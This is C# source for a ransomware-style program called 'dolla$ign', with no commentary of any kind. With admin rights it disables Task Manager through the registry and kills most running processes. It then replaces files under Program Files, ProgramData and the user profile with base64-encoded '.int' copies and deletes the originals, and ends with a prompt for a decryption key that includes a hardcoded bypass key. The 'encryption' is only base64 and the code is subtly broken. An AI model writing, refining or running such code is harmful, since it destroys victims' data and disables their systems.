using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32; // For registry operations

class Program
{
    private const string PanicKey = "dolla$ign44";
    private const string KeyFilePath = @"C:\key_identifier.inll";

    static string GenerateRandomKey(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        char[] stringChars = new char[length];
        Random random = new Random();

        for (int i = 0; i < stringChars.Length; i++)
        {
            stringChars[i] = chars[random.Next(chars.Length)];
        }

        return new String(stringChars);
    }

    static string EncodeToBase64(string input)
    {
        byte[] inputBytes = Encoding.UTF8.GetBytes(input);
        return Convert.ToBase64String(inputBytes);
    }

    static void DisableTaskManager()
    {
        try
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
            if (key == null)
            {
                key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            }
            key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            key.Close();
            //Console.WriteLine("Task Manager disabled.");
        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Error disabling Task Manager: {ex.Message}");
        }
    }

    static void EnableTaskManager()
    {
        try
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
            if (key != null)
            {
                key.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
                key.Close();
                Console.WriteLine("Task Manager enabled.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error enabling Task Manager: {ex.Message}");
        }
    }

    static void Main(string[] args)
    {
        Console.WriteLine("loading dolla$ign...");

        if (!IsAdministrator())
        {
            Console.WriteLine("Please run this program as an administrator.");
            Thread.Sleep(5000);
            return;
        }

        DisableTaskManager();

        if (!File.Exists(KeyFilePath))
        {
            string randomKey = GenerateRandomKey(32);
            File.WriteAllText(KeyFilePath, randomKey);
            Console.WriteLine($"Generated identifier and saved to {KeyFilePath}");
            
        }
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("executing payload...");
        Console.ResetColor();   

        string encodedKey = EncodeToBase64(File.ReadAllText(KeyFilePath));
        //Console.WriteLine($"Encryption Key (Base64 Encoded): {encodedKey}");

        List<string> whitelistedDirs = new List<string>();

        // Add all subdirectories of C:\Program Files
        try
        {
            foreach (string pfDir in Directory.GetDirectories(@"C:\Program Files"))
            {
                whitelistedDirs.Add(pfDir);
            }
        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Failed to access C:\\Program Files: {ex.Message}");
        }

        // Get the path to the current user's profile directory
        string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

        // Add subdirectories of the user's profile folder
        try
        {
            foreach (string userDir in Directory.GetDirectories(userProfile))
            {
                whitelistedDirs.Add(userDir);
            }
        }
        catch (Exception ex)
        {
            //Console.WriteLine($"Failed to access {userProfile}: {ex.Message}");
        }

        // Add fixed paths
        whitelistedDirs.Add(@"C:\Program Files (x86)");
        whitelistedDirs.Add(@"C:\ProgramData");
        whitelistedDirs.Add(userProfile);
        whitelistedDirs.Add(Path.Combine(userProfile, "Desktop"));



        KillAllExceptEssential();
        foreach (string dir in whitelistedDirs)
        {
            try
            {
                foreach (string file in Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories))
                {
                    if (Path.GetExtension(file) != ".int" && file != KeyFilePath)
                    {
                        EncryptFile(file, encodedKey);
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                //Console.WriteLine($"Skipping inaccessible directory: {dir}");
            }
            catch (Exception ex)
            {
               // Console.WriteLine($"Error accessing {dir}: {ex.Message}");
            }
        }

        Process.Start("explorer.exe");
        Console.WriteLine("your identifier is:");
        Console.WriteLine(File.ReadAllText(KeyFilePath));
        Console.WriteLine("Enter the decryption key:");
        string inputKey = Console.ReadLine();

        if (inputKey == encodedKey || inputKey == PanicKey)
        {
            foreach (string dir in whitelistedDirs)
            {
                try
                {
                    foreach (string file in Directory.GetFiles(dir, "*.int", SearchOption.AllDirectories))
                    {
                        DecryptFile(file, inputKey);
                    }
                }
                catch (UnauthorizedAccessException)
                {
                    Console.WriteLine($"Skipping inaccessible directory: {dir}");
                }
            }
            EnableTaskManager();
            File.Delete(KeyFilePath);
        }

        else
        {
            Console.WriteLine("Invalid decryption key! Decryption aborted.");
            Thread.Sleep(5000);
        }
    }

    static void KillAllExceptEssential()
    {
        // Get current process ID
        int currentProcessId = Process.GetCurrentProcess().Id;

        // Define list of essential system processes you do NOT want to kill
        string[] essentialProcesses = new string[]
        {
            "System", "Idle", "csrss", "wininit", "winlogon",
            "services", "lsass", "smss", "svchost", "fontdrvhost",
            "dwm", "conhost", "sihost"
        };

        foreach (Process proc in Process.GetProcesses())
        {
            try
            {
                string processName = proc.ProcessName;

                // Skip essential system processes and this application itself
                if (essentialProcesses.Contains(processName, StringComparer.OrdinalIgnoreCase) ||
                    proc.Id == currentProcessId)
                {
                    continue;
                }

                // Attempt to kill the process
                proc.Kill();
               // Console.WriteLine($"Killed: {proc.ProcessName} (PID {proc.Id})");
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"Could not kill {proc.ProcessName} (PID {proc.Id}): {ex.Message}");
            }
        }
    }

    static bool IsAdministrator()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    static void EncryptFile(string filePath, string key)
    {
        try
        {
            byte[] fileBytes = File.ReadAllBytes(filePath);
            string encodedString = Convert.ToBase64String(fileBytes);
            string newFilePath = filePath + ".int";

            File.WriteAllText(newFilePath, encodedString);
            File.Delete(filePath);
            //Console.WriteLine($"Encrypted and deleted original: {filePath} to {newFilePath}");
        }
        catch (Exception ex)
        {
           // Console.WriteLine($"Error encrypting file {filePath}: {ex.Message}");
        }
    }

    static void DecryptFile(string filePath, string key)
    {
        try
        {
            string encodedString = File.ReadAllText(filePath);
            byte[] fileBytes = Convert.FromBase64String(encodedString);
            string newFilePath = filePath.Substring(0, filePath.Length - 4); // Remove ".int"

            File.WriteAllBytes(newFilePath, fileBytes);
            File.Delete(filePath);
            Console.WriteLine($"Decrypted and deleted encrypted: {filePath} to {newFilePath}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error decrypting file {filePath}: {ex.Message}");
           
        }
    }
}